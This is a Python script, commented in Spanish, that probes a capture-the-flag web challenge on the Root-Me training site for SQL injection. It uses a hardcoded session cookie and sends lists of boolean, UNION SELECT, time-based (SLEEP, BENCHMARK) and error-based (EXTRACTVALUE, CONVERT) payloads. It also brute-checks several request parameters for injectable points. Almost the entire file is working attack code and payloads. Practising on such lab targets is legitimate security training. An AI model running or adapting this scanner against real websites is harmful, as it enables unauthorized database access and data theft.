import requests
import time
import hashlib

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

def get_response(payload, action="member"):
    """Obtiene la respuesta para un payload dado"""
    if action == "member":
        params = {
            "action": "member",
            "member": payload
        }
    else:
        params = {"action": payload}
    
    try:
        r = requests.get(URL, params=params, cookies=COOKIE, timeout=5)
        return {
            "status_code": r.status_code,
            "content_length": len(r.text),
            "content_hash": hashlib.md5(r.text.encode()).hexdigest(),
            "content": r.text,
            "time": 0
        }
    except:
        return None

def analyze_patterns():
    """Analiza patrones de comportamiento"""
    
    print("="*70)
    print("  ANÁLISIS DE PATRONES - SQL INJECTION")
    print("="*70)
    
    # 1. Baseline - Respuesta normal
    print("\n[1] Baseline (member=1):")
    baseline = get_response("1")
    if baseline:
        print(f"    Length: {baseline['content_length']}")
        print(f"    Hash: {baseline['content_hash'][:16]}...")
        print(f"    Contiene 'admin'? {'admin' in baseline['content']}")
        print(f"    Contiene 'jsilver'? {'jsilver' in baseline['content']}")
        print(f"    Contiene 'jsparow'? {'jsparow' in baseline['content']}")
    
    # 2. Probar condiciones TRUE vs FALSE
    print("\n[2] Comparando TRUE vs FALSE:")
    
    tests = [
        ("TRUE", "1 AND 1=1"),
        ("FALSE", "1 AND 1=2"),
        ("TRUE'", "1' AND '1'='1"),
        ("FALSE'", "1' AND '1'='2"),
        ("TRUE)", "1) AND (1=1"),
        ("FALSE)", "1) AND (1=2"),
    ]
    
    results = {}
    for name, payload in tests:
        resp = get_response(payload)
        if resp:
            results[name] = resp
            print(f"  {name}: Length={resp['content_length']}, Hash={resp['content_hash'][:12]}...")
            time.sleep(0.5)
    
    # 3. Buscar diferencias en contenido
    print("\n[3] Buscando diferencias de contenido...")
    if len(results) >= 2:
        for name, resp in results.items():
            if "error" in resp['content'].lower():
                print(f"  [!] '{name}' contiene 'error'")
            if "admin" in resp['content']:
                print(f"  [!] '{name}' contiene 'admin'")
            if "Authentification" in resp['content']:
                print(f"  [!] '{name}' contiene 'Authentification'")
    
    # 4. Probar con UNION SELECT para ver columnas
    print("\n[4] Probando UNION SELECT...")
    union_tests = [
        "1 UNION SELECT 1",
        "1 UNION SELECT 1,2",
        "1 UNION SELECT 1,2,3",
        "1 UNION SELECT 1,2,3,4",
        "1' UNION SELECT 1,2,3-- -",
        "1' UNION SELECT 1,2,3,4-- -",
        "1) UNION SELECT 1,2,3-- -",
    ]
    
    for payload in union_tests:
        resp = get_response(payload)
        if resp:
            # Buscar números en la respuesta que no deberían estar
            content = resp['content']
            if "2" in content and "3" in content:
                print(f"  [+] Posible UNION funcionando: {payload}")
                print(f"      Length: {resp['content_length']}")
                # Mostrar snippet
                print(f"      Snippet: {content[200:400]}...")
            else:
                print(f"  [-] No funciona: {payload}")
            time.sleep(0.5)

def check_blind_patterns():
    """Busca patrones de Blind SQL Injection"""
    
    print("\n" + "="*70)
    print("  ANÁLISIS DE BLIND SQL INJECTION")
    print("="*70)
    
    # Probar diferentes técnicas de blind
    blind_tests = [
        # Boolean-based
        ("BOOLEAN - TRUE", "1 AND 1=1"),
        ("BOOLEAN - FALSE", "1 AND 1=2"),
        ("BOOLEAN - TRUE'", "1' AND '1'='1"),
        ("BOOLEAN - FALSE'", "1' AND '1'='2"),
        
        # Time-based (con diferentes sintaxis)
        ("TIME - SLEEP", "1 AND SLEEP(3)"),
        ("TIME - SLEEP'", "1' AND SLEEP(3)-- -"),
        ("TIME - IF SLEEP", "1 AND IF(1=1, SLEEP(3), 0)"),
        ("TIME - IF SLEEP'", "1' AND IF(1=1, SLEEP(3), 0)-- -"),
        ("TIME - BENCHMARK", "1 AND BENCHMARK(10000000, MD5('x'))"),
        ("TIME - BENCHMARK'", "1' AND BENCHMARK(10000000, MD5('x'))-- -"),
        
        # Error-based
        ("ERROR - Convert", "1 AND 1=CONVERT(int, @@version)"),
        ("ERROR - Convert'", "1' AND 1=CONVERT(int, @@version)-- -"),
        ("ERROR - Extract", "1 AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))"),
        ("ERROR - Extract'", "1' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))-- -"),
    ]
    
    print("\nProbando diferentes técnicas de Blind SQL Injection...\n")
    print("Tiempos de respuesta (segundos):")
    print("-" * 70)
    
    for name, payload in blind_tests:
        inicio = time.time()
        try:
            params = {
                "action": "member",
                "member": payload
            }
            r = requests.get(URL, params=params, cookies=COOKIE, timeout=30)
            tiempo = time.time() - inicio
            
            # Analizar respuesta
            if tiempo > 2:
                print(f"✅ {name:20} -> {tiempo:.2f}s (¡POSIBLE VULNERABLE!)")
                print(f"   Payload: {payload}")
                if "error" in r.text.lower() or "warning" in r.text.lower():
                    print(f"   [CONTENIDO] Contiene error/warning")
            else:
                print(f"❌ {name:20} -> {tiempo:.2f}s")
                
        except Exception as e:
            print(f"⚠️  {name:20} -> ERROR: {str(e)[:30]}")
        
        time.sleep(0.5)

def find_injection_point():
    """Encuentra el punto exacto de inyección"""
    
    print("\n" + "="*70)
    print("  ENCONTRANDO PUNTO DE INYECCIÓN")
    print("="*70)
    
    # Probar todos los parámetros posibles
    test_params = [
        ("action", "login"),
        ("action", "memberlist"),
        ("action", "member"),
        ("member", "1"),
        ("page", "1"),
        ("id", "1"),
        ("user", "1"),
    ]
    
    # Probar diferentes métodos de inyección en cada parámetro
    injections = [
        "' OR '1'='1",
        "' AND '1'='1",
        "' UNION SELECT 1,2,3-- -",
        "' AND SLEEP(3)-- -",
        "1' AND SLEEP(3)-- -",
    ]
    
    for param, value in test_params:
        print(f"\n[*] Probando parámetro: {param}={value}")
        for inj in injections:
            # Construir el payload
            if param == "action":
                payload_value = value + inj
                params = {param: payload_value}
            else:
                params = {"action": "member", param: value + inj}
            
            try:
                inicio = time.time()
                r = requests.get(URL, params=params, cookies=COOKIE, timeout=30)
                tiempo = time.time() - inicio
                
                # Buscar cambios en la respuesta
                if tiempo > 2 or "error" in r.text.lower():
                    print(f"  [!] POSIBLE VULNERABLE: {param}={value}{inj}")
                    print(f"      Tiempo: {tiempo:.2f}s")
                    print(f"      Length: {len(r.text)}")
                    if "error" in r.text.lower():
                        print(f"      Contiene: {r.text[:200]}...")
            except:
                pass
            time.sleep(0.3)

if __name__ == "__main__":
    analyze_patterns()
    check_blind_patterns()
    find_injection_point()
